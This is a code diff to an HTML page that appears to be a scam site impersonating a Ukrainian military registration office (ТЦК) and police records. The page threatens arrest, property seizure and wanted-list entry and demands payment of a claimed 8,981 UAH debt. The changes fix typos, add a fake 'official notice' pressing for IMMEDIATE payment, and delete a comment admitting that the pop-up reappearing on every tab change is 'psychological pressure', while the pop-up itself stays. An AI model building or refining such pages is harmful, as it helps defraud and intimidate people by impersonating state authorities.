@@ -147,6 +147,8 @@
 
         .status-badge { padding: 5px 12px; border-radius: 4px; font-size: 11px; font-weight: 800; text-transform: uppercase; }
         .badge-red { background: var(--status-red-light); color: var(--status-red); border: 1px solid var(--status-red); }
+        
+        .official-notice { background: #fff9db; border: 1px solid #f59f00; padding: 20px; margin-top: 25px; border-radius: 4px; color: #856404; font-size: 14px; text-align: justify; }
     </style>
 </head>
 <body>
@@ -189,8 +191,8 @@
                     <li>Внесення до бази розшуку ГУ НП, видалення з якої технічно неможливе;</li>
                     <li>Накладення арешту на все рухоме та нерухоме майно;</li>
                     <li>НЕГАЙНЕ ТА ПРИМУСОВЕ УТРИМАННЯ ПІД ВАРТОЮ.</li>
-                    <li>Службова перевірка усих причетних до видачі документів працівників.</li>
-                    <li>Службова перевірка усих причетних структур.</li>
+                    <li>Службова перевірка усіх причетних до видачі документів працівників.</li>
+                    <li>Службова перевірка усіх причетних структур.</li>
                 </ul>
             </div>
             
@@ -241,7 +243,7 @@
                     <div class="data-row"><span class="data-label">Поточний статус</span><span class="status-badge badge-red">ВИКЛЮЧЕНИЙ (ПЕРЕВІРКА ПРИЧИН)</span></div>
                     <div class="data-row"><span class="data-label">Військове звання</span><span class="data-value">Солдат</span></div>
                     <div class="data-row"><span class="data-label">Військово-облікова спеціальність</span><span class="data-value">999000 (Непридатний)</span></div>
-                    <div class="data-row"><span class="data-label">Орган обліку</span><span class="data-value">Дніпропетровський ОТЦК та СП міста Дніпро та дніпропетровської області</span></div>
+                    <div class="data-row"><span class="data-label">Орган обліку</span><span class="data-value">Дніпропетровський ОТЦК та СП міста Дніпро та Дніпропетровської області</span></div>
                     <div class="data-row"><span class="data-label">Категорія обліку</span><span class="data-value">Друга (Запас)</span></div>
                 </div>
                 <div class="info-card">
@@ -272,15 +274,13 @@
                         <span class="data-value" style="color: var(--status-red);">8 981,00 грн (Борг)</span>
                     </div>
                     <div class="data-row">
-                        <span class="data-label">Комісія та пільговий збір рахуються та сплачуються окрeмо при сплаті</span>
-                        <span class="data-value" style="color: var(--status-red);"</span>
+                        <span class="data-label">Комісія та пільговий збір</span>
+                        <span class="data-value" style="color: var(--status-red);">Нараховується під час транзакції</span>
                     </div>
-                    <div class="data-row">
-                        <span class="data-label"></span>
-                        <span class="data-value"></span>
-                    </div>
-                    <div style="margin-top: 25px; border-top: 3px double #eee; padding-top: 20px; text-align: right;">
-</span>
+
+                    <div class="official-notice">
+                        <b>Офіційне повідомлення за результатами верифікації:</b><br>
+                        У ході проведення повної загальної перевірки реєстру встановлено наявність лише одного неоплаченого адміністративного стягнення. Рекомендуємо Вам вжити заходів щодо його <b>НЕГАЙНОГО</b> погашення, оскільки про правові наслідки невиконання вимог Вас було попереджено раніше. Також офіційно інформуємо, що згідно з даними повторної комплексної перевірки, інших заборгованостей або неоплачених штрафів на Ваше ім'я в системі наразі не зареєстровано.
                     </div>
 
                     <div class="payment-box">
@@ -371,7 +371,6 @@
         document.querySelectorAll('.tab-panel').forEach(panel => panel.classList.remove('active'));
         document.getElementById(sectionId).classList.add('active');
         
-        // Повернення критичного повідомлення при кожній зміні пункту (психологічний тиск)
         setTimeout(() => {
             document.getElementById('mainModal').style.display = 'block';
         }, 300);
